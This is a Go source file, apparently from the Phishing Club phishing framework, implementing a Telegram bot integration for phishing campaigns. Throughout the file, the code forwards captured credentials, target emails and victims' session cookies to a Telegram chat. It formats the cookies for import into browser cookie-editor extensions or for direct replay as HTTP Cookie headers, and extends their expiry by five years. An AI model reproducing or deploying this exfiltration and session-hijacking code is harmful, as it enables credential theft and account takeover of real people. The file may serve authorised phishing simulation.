package service

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"strings"
	"time"

	"github.com/phishingclub/phishingclub/errs"
	"github.com/phishingclub/phishingclub/model"
	"go.uber.org/zap"
)

const (
	telegramAPIBase = "https://api.telegram.org/bot"
	// OptionKeyTelegramSettings is the option key for the global Telegram settings JSON.
	OptionKeyTelegramSettings = "telegram_settings"
)

// Telegram handles Telegram Bot API notifications.
// It is designed to be called from the existing Campaign.HandleWebhooks flow
// so that every event that fires a webhook can also fire a Telegram message.
type Telegram struct {
	Common
	OptionRepository interface {
		GetByKey(ctx context.Context, key string) (*model.Option, error)
		UpsertByKey(ctx context.Context, key string, value string) error
	}
}

// TelegramSettings holds the global Telegram integration settings stored via the Option service.
// They are persisted as JSON under the option key "telegram_settings".
type TelegramSettings struct {
	Enabled  bool   `json:"enabled"`
	BotToken string `json:"botToken"`
	ChatID   string `json:"chatID"`
	// ThreadID is optional; when set messages are sent to a specific topic inside a supergroup.
	ThreadID string `json:"threadID,omitempty"`
	// Events is a bitmask identical to the webhook events bitmask.
	// 0 means all events (backward-compatible with webhook behaviour).
	Events int `json:"events"`
	// DataLevel controls how much information is included: "none", "basic", "full".
	DataLevel string `json:"dataLevel"`
	// SendCookieFile when true attaches captured cookies as a .txt file.
	SendCookieFile bool `json:"sendCookieFile"`
	// CookieFormat controls the format of the cookie file attachment.
	// Supported values: "netscape" (default), "json", "header".
	CookieFormat string `json:"cookieFormat,omitempty"`
}

// GetSettings loads the current Telegram settings from the option store.
func (t *Telegram) GetSettings(ctx context.Context) (*TelegramSettings, error) {
	opt, err := t.OptionRepository.GetByKey(ctx, OptionKeyTelegramSettings)
	if err != nil {
		return nil, errs.Wrap(err)
	}
	var settings TelegramSettings
	if err := json.Unmarshal([]byte(opt.Value.String()), &settings); err != nil {
		return nil, errs.Wrap(err)
	}
	return &settings, nil
}

// SaveSettings persists the Telegram settings to the option store.
func (t *Telegram) SaveSettings(ctx context.Context, settings *TelegramSettings) error {
	data, err := json.Marshal(settings)
	if err != nil {
		return errs.Wrap(err)
	}
	return t.OptionRepository.UpsertByKey(ctx, OptionKeyTelegramSettings, string(data))
}

// Notify is the main entry point called after a webhook event fires.
// It checks whether Telegram is enabled and whether the event should be sent,
// then formats and dispatches the message.
func (t *Telegram) Notify(
	ctx context.Context,
	eventName string,
	campaignName string,
	email string,
	capturedData map[string]interface{},
) {
	settings, err := t.GetSettings(ctx)
	if err != nil || !settings.Enabled || settings.BotToken == "" || settings.ChatID == "" {
		return
	}

	// check event bitmask (0 = all events, same logic as webhooks)
	if settings.Events != 0 && !model.IsWebhookEventEnabled(settings.Events, eventName) {
		return
	}

	// build message
	msg := t.formatMessage(settings, eventName, campaignName, email, capturedData)

	// check if we should attach a cookie file
	hasCookies := false
	var cookieFileContent string
	var cookieFileName string
	if settings.SendCookieFile && settings.DataLevel == model.WebhookDataLevelFull {
		if cookies, ok := capturedData["cookies"]; ok {
			switch settings.CookieFormat {
			case "json":
				cookieFileContent = t.formatCookiesJSON(cookies, capturedData)
				cookieFileName = "cookies.json"
			case "header":
				cookieFileContent = t.formatCookiesHeader(cookies, capturedData)
				cookieFileName = "cookies.txt"
			default: // "netscape" or empty (backward-compatible)
				cookieFileContent = t.formatCookiesNetscape(cookies, capturedData)
				cookieFileName = "cookies.txt"
			}
			hasCookies = cookieFileContent != ""
		}
	}

	// send in background so we never block the request
	go func() {
		if hasCookies {
			if err := t.sendDocument(settings, msg, cookieFileName, []byte(cookieFileContent)); err != nil {
				t.Logger.Errorw("telegram: failed to send document", "error", err)
			}
		} else {
			if err := t.sendMessage(settings, msg); err != nil {
				t.Logger.Errorw("telegram: failed to send message", "error", err)
			}
		}
	}()
}

// formatMessage builds a Telegram-friendly HTML message.
func (t *Telegram) formatMessage(
	settings *TelegramSettings,
	eventName string,
	campaignName string,
	email string,
	capturedData map[string]interface{},
) string {
	var sb strings.Builder

	// header with event icon
	icon := t.eventIcon(eventName)
	sb.WriteString(fmt.Sprintf("%s <b>%s</b>\n", icon, t.humanEventName(eventName)))
	sb.WriteString(fmt.Sprintf("<code>%s</code>\n\n", time.Now().UTC().Format("2006-01-02 15:04:05 UTC")))

	switch settings.DataLevel {
	case model.WebhookDataLevelNone:
		// minimal
	case model.WebhookDataLevelBasic:
		if campaignName != "" {
			sb.WriteString(fmt.Sprintf("<b>Campaign:</b> %s\n", escapeHTML(campaignName)))
		}
	case model.WebhookDataLevelFull:
		if campaignName != "" {
			sb.WriteString(fmt.Sprintf("<b>Campaign:</b> %s\n", escapeHTML(campaignName)))
		}
		if email != "" {
			sb.WriteString(fmt.Sprintf("<b>Target:</b> <code>%s</code>\n", escapeHTML(email)))
		}
		if capturedData != nil && len(capturedData) > 0 {
			sb.WriteString("\n<b>Captured Data:</b>\n")
			for k, v := range capturedData {
				if k == "cookies" {
					// summarise cookie count instead of dumping raw data
					if cookieMap, ok := v.(map[string]interface{}); ok {
						sb.WriteString(fmt.Sprintf("  <b>cookies:</b> %d captured\n", len(cookieMap)))
					}
					continue
				}
				sb.WriteString(fmt.Sprintf("  <b>%s:</b> <code>%s</code>\n", escapeHTML(k), escapeHTML(fmt.Sprintf("%v", v))))
			}
		}
	}

	return sb.String()
}

// formatCookiesNetscape converts captured cookie data to Netscape cookie.txt format.
// Supports cookies as: map[string]interface{}, []interface{} (JSON array), or string (JSON).
func (t *Telegram) formatCookiesNetscape(cookies interface{}, capturedData map[string]interface{}) string {
	targetDomain := ""
	if td, ok := capturedData["target_domain"].(string); ok {
		targetDomain = td
	}

	// Normalize cookies into a slice of map[string]interface{}
	var cookieList []map[string]interface{}

	switch v := cookies.(type) {
	case map[string]interface{}:
		// Old format: map keyed by cookie identifier
		for _, cookieData := range v {
			if cd, ok := cookieData.(map[string]interface{}); ok {
				cookieList = append(cookieList, cd)
			}
		}
	case []interface{}:
		// Array format from buildAllCookiesJSON
		for _, cookieData := range v {
			if cd, ok := cookieData.(map[string]interface{}); ok {
				cookieList = append(cookieList, cd)
			}
		}
	case string:
		// JSON string - try to parse as array first, then as map
		var arr []map[string]interface{}
		if err := json.Unmarshal([]byte(v), &arr); err == nil {
			cookieList = arr
		} else {
			var m map[string]interface{}
			if err := json.Unmarshal([]byte(v), &m); err == nil {
				for _, cookieData := range m {
					if cd, ok := cookieData.(map[string]interface{}); ok {
						cookieList = append(cookieList, cd)
					}
				}
			}
		}
	default:
		return ""
	}

	if len(cookieList) == 0 {
		return ""
	}

	var sb strings.Builder
	sb.WriteString("# Netscape HTTP Cookie File\n")
	sb.WriteString("# Generated by Phishing Club\n")
	sb.WriteString(fmt.Sprintf("# Date: %s\n\n", time.Now().UTC().Format(time.RFC3339)))

	for _, cd := range cookieList {
		domain := targetDomain
		if d, ok := cd["domain"].(string); ok && d != "" {
			domain = d
		}
		name := ""
		if n, ok := cd["name"].(string); ok {
			name = n
		}
		value := ""
		if val, ok := cd["value"].(string); ok {
			value = val
		}
		path := "/"
		if p, ok := cd["path"].(string); ok && p != "" {
			path = p
		}
		secure := "FALSE"
		if s, ok := cd["secure"].(string); ok && s == "true" {
			secure = "TRUE"
		} else if s, ok := cd["secure"].(bool); ok && s {
			secure = "TRUE"
		}
		expiry := "0"
		if e, ok := cd["expiry"].(string); ok && e != "" {
			expiry = e
		}
		httpOnly := "TRUE"
		if ho, ok := cd["httpOnly"].(string); ok && ho == "false" {
			httpOnly = "FALSE"
		} else if ho, ok := cd["httpOnly"].(bool); ok && !ho {
			httpOnly = "FALSE"
		}
		sb.WriteString(fmt.Sprintf("%s\t%s\t%s\t%s\t%s\t%s\t%s\n",
			domain, httpOnly, path, secure, expiry, name, value))
	}

	return sb.String()
}

// normalizeCookieList is a shared helper that normalizes cookies from various input types
// into a uniform []map[string]interface{} slice.
func (t *Telegram) normalizeCookieList(cookies interface{}) []map[string]interface{} {
	var cookieList []map[string]interface{}
	switch v := cookies.(type) {
	case map[string]interface{}:
		for _, cookieData := range v {
			if cd, ok := cookieData.(map[string]interface{}); ok {
				cookieList = append(cookieList, cd)
			}
		}
	case []interface{}:
		for _, cookieData := range v {
			if cd, ok := cookieData.(map[string]interface{}); ok {
				cookieList = append(cookieList, cd)
			}
		}
	case string:
		var arr []map[string]interface{}
		if err := json.Unmarshal([]byte(v), &arr); err == nil {
			cookieList = arr
		} else {
			var m map[string]interface{}
			if err := json.Unmarshal([]byte(v), &m); err == nil {
				for _, cookieData := range m {
					if cd, ok := cookieData.(map[string]interface{}); ok {
						cookieList = append(cookieList, cd)
					}
				}
			}
		}
	}
	return cookieList
}

// formatCookiesJSON converts captured cookie data to a JSON array format
// compatible with browser extensions like Cookie Editor and EditThisCookie.
func (t *Telegram) formatCookiesJSON(cookies interface{}, capturedData map[string]interface{}) string {
	cookieList := t.normalizeCookieList(cookies)
	if len(cookieList) == 0 {
		return ""
	}

	targetDomain := ""
	if td, ok := capturedData["target_domain"].(string); ok {
		targetDomain = td
	}

	type exportCookie struct {
		Name           string  `json:"name"`
		Value          string  `json:"value"`
		Domain         string  `json:"domain"`
		Path           string  `json:"path"`
		ExpirationDate float64 `json:"expirationDate,omitempty"`
		HttpOnly       bool    `json:"httpOnly"`
		Secure         bool    `json:"secure"`
		SameSite       string  `json:"sameSite,omitempty"`
		HostOnly       bool    `json:"hostOnly"`
		Session        bool    `json:"session"`
		StoreId        string  `json:"storeId"`
	}

	var exported []exportCookie
	for _, cd := range cookieList {
		domain := targetDomain
		if d, ok := cd["domain"].(string); ok && d != "" {
			domain = d
		}
		if oh, ok := cd["original_host"].(string); ok && oh != "" {
			domain = oh
		}
		name, _ := cd["name"].(string)
		value, _ := cd["value"].(string)
		path := "/"
		if p, ok := cd["path"].(string); ok && p != "" {
			path = p
		}
		secure := false
		if s, ok := cd["secure"].(string); ok && s == "true" {
			secure = true
		} else if s, ok := cd["secure"].(bool); ok {
			secure = s
		}
		httpOnly := false
		if ho, ok := cd["httpOnly"].(string); ok && ho == "true" {
			httpOnly = true
		} else if ho, ok := cd["httpOnly"].(bool); ok {
			httpOnly = ho
		}
		sameSite := "no_restriction"
		if ss, ok := cd["sameSite"].(string); ok && ss != "" {
			sameSite = ss
		}

		exported = append(exported, exportCookie{
			Name:           name,
			Value:          value,
			Domain:         domain,
			Path:           path,
			ExpirationDate: float64(time.Now().Add(5 * 365 * 24 * time.Hour).Unix()),
			HttpOnly:       httpOnly,
			Secure:         secure,
			SameSite:       sameSite,
			HostOnly:       !strings.HasPrefix(domain, "."),
			Session:        false,
			StoreId:        "0",
		})
	}

	data, err := json.MarshalIndent(exported, "", "    ")
	if err != nil {
		return ""
	}
	return string(data)
}

// formatCookiesHeader converts captured cookie data to a Cookie header string
// (name=value; name2=value2) suitable for direct use in HTTP requests.
func (t *Telegram) formatCookiesHeader(cookies interface{}, capturedData map[string]interface{}) string {
	cookieList := t.normalizeCookieList(cookies)
	if len(cookieList) == 0 {
		return ""
	}

	var parts []string
	for _, cd := range cookieList {
		name, _ := cd["name"].(string)
		value, _ := cd["value"].(string)
		if name != "" && value != "" {
			parts = append(parts, fmt.Sprintf("%s=%s", name, value))
		}
	}

	return strings.Join(parts, "; ")
}

// sendMessage sends a text message via the Telegram Bot API.
func (t *Telegram) sendMessage(settings *TelegramSettings, text string) error {
	url := fmt.Sprintf("%s%s/sendMessage", telegramAPIBase, settings.BotToken)

	payload := map[string]interface{}{
		"chat_id":    settings.ChatID,
		"text":       text,
		"parse_mode": "HTML",
	}
	if settings.ThreadID != "" {
		payload["message_thread_id"] = settings.ThreadID
	}

	body, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, "POST", url, bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("telegram API returned %d: %s", resp.StatusCode, string(respBody))
	}
	return nil
}

// sendDocument sends a file with a caption via the Telegram Bot API.
func (t *Telegram) sendDocument(settings *TelegramSettings, caption string, filename string, content []byte) error {
	url := fmt.Sprintf("%s%s/sendDocument", telegramAPIBase, settings.BotToken)

	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)

	_ = writer.WriteField("chat_id", settings.ChatID)
	_ = writer.WriteField("caption", caption)
	_ = writer.WriteField("parse_mode", "HTML")
	if settings.ThreadID != "" {
		_ = writer.WriteField("message_thread_id", settings.ThreadID)
	}

	part, err := writer.CreateFormFile("document", filename)
	if err != nil {
		return err
	}
	if _, err := part.Write(content); err != nil {
		return err
	}
	writer.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, "POST", url, &buf)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("telegram API returned %d: %s", resp.StatusCode, string(respBody))
	}
	return nil
}

// SendTestMessage sends a test notification to verify the Telegram configuration.
func (t *Telegram) SendTestMessage(settings *TelegramSettings) error {
	msg := fmt.Sprintf(
		"<b>Phishing Club Test Notification</b>\n\n"+
			"<code>%s</code>\n\n"+
			"Your Telegram integration is working correctly.",
		time.Now().UTC().Format("2006-01-02 15:04:05 UTC"),
	)
	return t.sendMessage(settings, msg)
}

// eventIcon returns an emoji for the event type.
func (t *Telegram) eventIcon(eventName string) string {
	switch eventName {
	case "campaign_recipient_submitted_data":
		return "\xF0\x9F\x94\x91" // key
	case "campaign_recipient_page_visited":
		return "\xF0\x9F\x91\x81" // eye
	case "campaign_recipient_message_sent":
		return "\xE2\x9C\x89" // envelope
	case "campaign_recipient_message_read":
		return "\xF0\x9F\x93\xA8" // incoming envelope
	case "campaign_closed":
		return "\xE2\x9C\x85" // check
	default:
		return "\xF0\x9F\x94\x94" // bell
	}
}

// humanEventName returns a human-readable event label.
func (t *Telegram) humanEventName(eventName string) string {
	switch eventName {
	case "campaign_recipient_submitted_data":
		return "Credentials Captured"
	case "campaign_recipient_page_visited":
		return "Landing Page Visited"
	case "campaign_recipient_message_sent":
		return "Email Sent"
	case "campaign_recipient_message_read":
		return "Email Opened"
	case "campaign_closed":
		return "Campaign Closed"
	case "campaign_recipient_evasion_page_visited":
		return "Evasion Page Visited"
	case "campaign_recipient_before_page_visited":
		return "Before Page Visited"
	case "campaign_recipient_after_page_visited":
		return "After Page Visited"
	case "campaign_recipient_deny_page_visited":
		return "Deny Page Visited"
	default:
		return eventName
	}
}

// escapeHTML escapes HTML special characters for Telegram HTML parse mode.
func escapeHTML(s string) string {
	s = strings.ReplaceAll(s, "&", "&amp;")
	s = strings.ReplaceAll(s, "<", "&lt;")
	s = strings.ReplaceAll(s, ">", "&gt;")
	return s
}

// NewTelegramService creates a Telegram service using the common logger.
func NewTelegramService(logger *zap.SugaredLogger, optionRepo interface {
	GetByKey(ctx context.Context, key string) (*model.Option, error)
	UpsertByKey(ctx context.Context, key string, value string) error
}) *Telegram {
	return &Telegram{
		Common: Common{
			Logger: logger,
		},
		OptionRepository: optionRepo,
	}
}
